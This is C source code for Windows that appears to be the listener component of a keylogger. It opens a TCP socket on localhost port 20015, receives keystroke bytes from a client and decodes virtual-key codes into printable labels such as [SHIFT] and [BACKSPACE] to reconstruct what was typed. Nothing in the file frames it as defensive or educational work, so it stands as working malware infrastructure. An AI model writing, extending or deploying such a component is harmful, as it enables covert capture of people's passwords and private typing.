#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <WinSock2.h>
#include <WS2tcpip.h>
#include <stdio.h>

// Need to link with Ws2_32.lib
#pragma comment (lib, "Ws2_32.lib")

void codeToChar(char code);

//Default IP and PORT
#define DEFAULT_PORT 20015
#define DEFAULT_IP "127.0.0.1"
#define MAX_BUFF 1024

int main(void){
	WSADATA wsaData;
	SOCKET ListenSocket = INVALID_SOCKET ;
	SOCKET clientSocket = INVALID_SOCKET;
	struct sockaddr_in server;
	char buffer[MAX_BUFF];

	//Initializing WSA
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		printf("Failed to initialize: %d\n", WSAGetLastError());
		return 1;
	}
	printf("WSAstartup() success.\n");
	//creating the socket to listen on
	ListenSocket = socket(AF_INET, SOCK_STREAM, 0);
	if (ListenSocket == INVALID_SOCKET) {
		printf("Failed to create socket: %d\n", WSAGetLastError());
		WSACleanup();
		return 1;
	}
	printf("socket() success.\n");
	// preparing sockaddr_in structure
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = inet_addr(DEFAULT_IP);
	server.sin_port = htons(DEFAULT_PORT);

	//binding to socket
	if (bind(ListenSocket, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
		printf("Failed to bind: %d\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}
	printf("bind() success.\n");
	//Listen for connection
	if (listen(ListenSocket, SOMAXCONN) == SOCKET_ERROR) {
		printf("Listen error: %d\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}
	printf("Listen() success.\n");
	// accept connection from user
	clientSocket = accept(ListenSocket, NULL, NULL);
	if (clientSocket == INVALID_SOCKET) {
		printf("Failed to accept connection: %d\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}
	printf("Accept() success.\n");

	//recieve data
	int iResult;
	do {
		iResult = recv(clientSocket, buffer, MAX_BUFF, 0);
		if (iResult > 0) {
			codeToChar(buffer[0]);
		}
		else if (iResult == 0){
			printf("Connection closed");
		}
		else {
			printf("recv failed %d\n", WSAGetLastError());
		}
	} while (iResult > 0);
	return 0;
}

void codeToChar(char code) {
	switch (code) {
	case VK_CAPITAL:
		printf("[CAPSLOCK]");
		break;
	case VK_SHIFT:
		printf("[SHIFT]");
		break;
	case VK_LCONTROL:
		printf("[LCONTROL]");
		break;
	case VK_RCONTROL:
		printf("[RCONTROL]");
		break;
	case VK_INSERT:
		printf("[INSERT]");
		break;
	case VK_END:
		printf("[END]");
		break;
	case VK_PRINT:
		printf("[PrtScr]");
		break;
	case VK_DELETE:
		printf("[DEL]");
		break;
	case VK_BACK:
		printf("[BACKSPACE]");
		break;
	case VK_LEFT:
		printf("[LEFT]");
		break;
	case VK_RIGHT:
		printf("[RIGHT]");
		break;
	case VK_UP:
		printf("[UP]");
		break;
	case VK_DOWN:
		printf("[DOWN]");
		break;
	case VK_RETURN:
		printf("[ENTER]");
		break;
	default:
		printf("%c", code);
	}
		
}